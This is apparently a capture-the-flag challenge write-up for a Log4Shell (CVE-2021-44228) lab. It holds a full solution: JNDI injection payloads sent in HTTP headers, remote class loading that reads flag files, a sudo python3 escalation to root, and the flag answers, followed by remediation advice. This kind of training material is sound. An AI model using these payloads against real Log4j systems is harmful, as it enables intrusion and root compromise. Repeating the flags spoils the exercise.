# Yankee — Log4Shell (CVE-2021-44228)

**Status:** ✅ Complete

## Overview

Log4Shell (CVE-2021-44228) is one of the most critical Java vulnerabilities ever discovered. This challenge recreates it in a realistic SOC dashboard that passes user-controlled inputs to a vulnerable Log4j 2.14.1 backend. Players must discover the injectable fields, trigger a JNDI callback, weaponize it into RCE via remote class loading, then escalate to root via a sudo misconfiguration.

## Player Description

EverSec's Security Operations Center runs a Java-based Log Analysis Platform for their SOC analysts to search and query security events. "Eating our own dog food," said the CISO — their security tool monitors everything, including itself. The platform was built in late 2021 and the team decided to keep dependency versions "stable." CVE-2021-44228 dropped shortly after. The team was notified. They're still "evaluating the patch."

## Technical Description

| Field | Value |
|-------|-------|
| **Category** | Web / Real CVE Exploitation |
| **Difficulty** | Hard |
| **Points** | 1,500 (3 flags) |
| **Port** | 4021 |
| **CVE** | CVE-2021-44228 (Log4Shell) |
| **CVSS** | 10.0 (Critical) — the highest possible score |
| **Affected versions** | Apache Log4j2 2.0-beta9 through 2.14.1 |

## Flags

| Flag | Points | Technique |
|------|--------|-----------|
| FLAG 1 | 300 | Discover the vulnerable input and trigger a JNDI callback |
| FLAG 2 | 500 | Chain JNDI to remote class loading for RCE |
| FLAG 3 | 700 | Escalate from service account to root via sudo misconfiguration |

## Setup

```bash
docker compose up -d yankee-log4shell
docker compose logs -f yankee-log4shell  # watch for startup
```

The container takes ~30 seconds to fully start (Java initialization). Access at `http://localhost:4021`.

## Learning Objectives

1. Understand why logging user-controlled strings without sanitization is dangerous
2. Learn the JNDI injection vector — `${jndi:ldap://...}` in Log4j 2.x
3. Understand the attack chain: log injection → JNDI lookup → LDAP → remote class loading → RCE
4. Practice privilege escalation from a service account via sudo misconfiguration

## Architecture (for challenge authors)

```
Container (port 4021)
├── Python Flask (0.0.0.0:4020)       — web interface, log result pages
├── Java AuditLogger (127.0.0.1:8080) — vulnerable Log4j 2.14.1 service
└── Python JNDI Server
    ├── LDAP  (127.0.0.1:1389)        — receives Log4j JNDI callbacks
    └── HTTP  (127.0.0.1:9999)        — serves .class files + collects RCE output
```

The Java audit logger is the vulnerable component. Flask forwards `X-Forwarded-For`, `User-Agent`, and search queries to it, which passes them directly to Log4j `logger.info()` calls.

---

## Solution

### Step 1 — Discover the vulnerable input

1. Check `robots.txt`:
   ```
   GET http://localhost:4021/robots.txt
   ```
   Notice `Disallow: /debug/log-preview`.

2. View the page source of any page — find the HTML comment:
   ```html
   <!-- EverSec Audit Logger v2.0 - Apache Log4j 2.14.1 backend -->
   ```
   Or check `/api/status` which explicitly states `"audit_backend": "Apache Log4j 2.14.1"`.

3. Visit `/debug/log-preview`. This shows recent Java audit log lines.

4. Send a probe request to confirm what gets logged:
   ```bash
   curl -H "X-Forwarded-For: probe-test-123" http://localhost:4021/
   ```
   Refresh `/debug/log-preview` — you'll see:
   ```
   09:14:22.401 INFO - Request from: probe-test-123
   ```
   The `X-Forwarded-For` header is logged verbatim. No sanitization.

---

### Step 2 — FLAG 1: Trigger JNDI callback (300 pts)

Log4j 2.14.1 evaluates `${...}` expressions inside log messages. The `${jndi:ldap://...}` lookup causes Log4j to make an outbound LDAP connection. There is an internal LDAP server running on `127.0.0.1:1389` — point the JNDI lookup at it to confirm the vulnerability.

```bash
curl -H 'X-Forwarded-For: ${jndi:ldap://127.0.0.1:1389/detect}' http://localhost:4021/
```

Then immediately check the JNDI callback log:
```bash
curl http://localhost:4021/internal/callbacks
```

Or visit `http://localhost:4021/internal/callbacks` in a browser. You'll see:

```
[2026-04-08 14:23:07]  path: /detect
JNDI callback received! CVE-2021-44228 confirmed.

Flag 1: l0g4sh3ll_jnd1_c4llb4ck
```

> **Note:** The JNDI log auto-clears every 3 minutes. Check it promptly.

> **Alternative inputs:** `User-Agent` header and the `?q=` search query are also logged.

---

### Step 3 — FLAG 2: Remote class loading RCE (500 pts)

The `/detect` path only confirmed the JNDI callback (detection mode). A more dangerous path triggers **remote class loading**: Log4j fetches a Java `.class` file from the LDAP server's referenced HTTP server and executes it in the JVM. The JNDI log hint says: *"This server also supports class-loading paths for deeper diagnostics."*

Use the `/exploit` path:

```bash
curl -H 'X-Forwarded-For: ${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:4021/
```

The LDAP server responds with a reference to `FlagReader.class`. The Java audit logger's JVM loads and executes it. `FlagReader`'s static initializer:
- Reads `/app/flag2.txt`
- Runs `sudo -l` (reveals the privilege escalation path)
- HTTP POSTs both to the output collector

Check the RCE log within 3 minutes:
```bash
curl http://localhost:4021/internal/diagnostic-output
```

Output:
```
=== RCE via Log4Shell (CVE-2021-44228) ===

FLAG2: rc3_v14_cl4ss_l04d1ng

--- sudo -l ---
Matching Defaults entries for ctfuser on ...:
    ...

User ctfuser may run the following commands on this host:
    (root) NOPASSWD: /usr/local/bin/python3

--- id ---
uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)
```

---

### Step 4 — FLAG 3: Privilege escalation via sudo python3 (700 pts)

The `sudo -l` output from FLAG 2 reveals that `ctfuser` can run `/usr/local/bin/python3` as root with no password. This is a classic GTFOBins vector.

Use the `/privesc` JNDI path to load `PrivEsc.class`, which executes the sudo privesc:

```bash
curl -H 'X-Forwarded-For: ${jndi:ldap://127.0.0.1:1389/privesc}' http://localhost:4021/
```

`PrivEsc`'s static initializer runs:
```bash
sudo /usr/local/bin/python3 -c "print(open('/root/flag3.txt').read())"
```

Check the RCE log:
```bash
curl http://localhost:4021/internal/diagnostic-output
```

Output:
```
=== Privilege Escalation via sudo python3 ===

FLAG3: r00t3d_v14_l0g4sh3ll
```

---

## Common Pitfalls

1. **JNDI log is empty after sending payload** — The log auto-clears every 3 minutes. Check `/internal/callbacks` immediately after triggering. Also verify the container is fully started (`docker compose logs yankee-log4shell`).

2. **Shell escaping** — In bash, `$` and `{` in the header value need quoting. Use single quotes: `curl -H 'X-Forwarded-For: ${jndi:...}'`.

3. **RCE log empty after `/exploit`** — Class loading is asynchronous from your HTTP response. Wait 3–5 seconds, then check `/internal/diagnostic-output`. If still empty, check container logs for Java errors.

4. **`/detect` only — no class load** — The `/detect` path is intentionally detection-only (no `javaCodeBase` attribute in the LDAP response). Use `/exploit` to trigger class loading.

5. **User-Agent also works** — `curl -A '${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:4021/` is equivalent to using `X-Forwarded-For`.

---

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

This is a Java application. Log4j 2.x had a critical vulnerability in late 2021 (CVE-2021-44228). It triggers when Log4j processes a string containing a JNDI lookup pattern. Where in this application might user-supplied input get logged — think about HTTP headers and request parameters.

</details>

<details>
<summary>Hint 2</summary>

Exploiting Log4Shell requires a server that can respond to the JNDI callback and deliver a payload. Tools that automate this setup are publicly available — search for "Log4Shell exploit" or look at popular security repositories from late 2021.

</details>

<details>
<summary>Hint 3</summary>

You have remote code execution on the server. What are the standard first checks a pentester makes when looking for privilege escalation paths on a Linux system?

</details>

## Prevention / Remediation

| Fix | Details |
|-----|---------|
| **Upgrade Log4j** | Update to Log4j 2.17.1+ (2.x) or 2.12.4+ (Java 7). Versions ≥ 2.15.0 disable JNDI by default; ≥ 2.16.0 remove the lookup entirely. |
| **JVM flag (temporary)** | Set `-Dlog4j2.formatMsgNoLookups=true` to disable message lookups (bypassed in some 2.15.0 variants). |
| **JNDI restrictions** | Set `-Dcom.sun.jndi.ldap.object.trustURLCodebase=false` (default in Java ≥ 8u191). |
| **Input sanitization** | Never log raw user-controlled strings. Sanitize or encode before logging. |
| **Egress filtering** | Block outbound LDAP/RMI from application servers at the network level. |
| **Least privilege** | The sudo misconfiguration is a separate critical finding. Application accounts should never have NOPASSWD sudo access. |

---

## References

- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [LunaSec Original Disclosure](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [CISA Log4j Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)
- [GTFOBins: python](https://gtfobins.github.io/gtfobins/python/)
- CWE-502: Deserialization of Untrusted Data
- CWE-20: Improper Input Validation
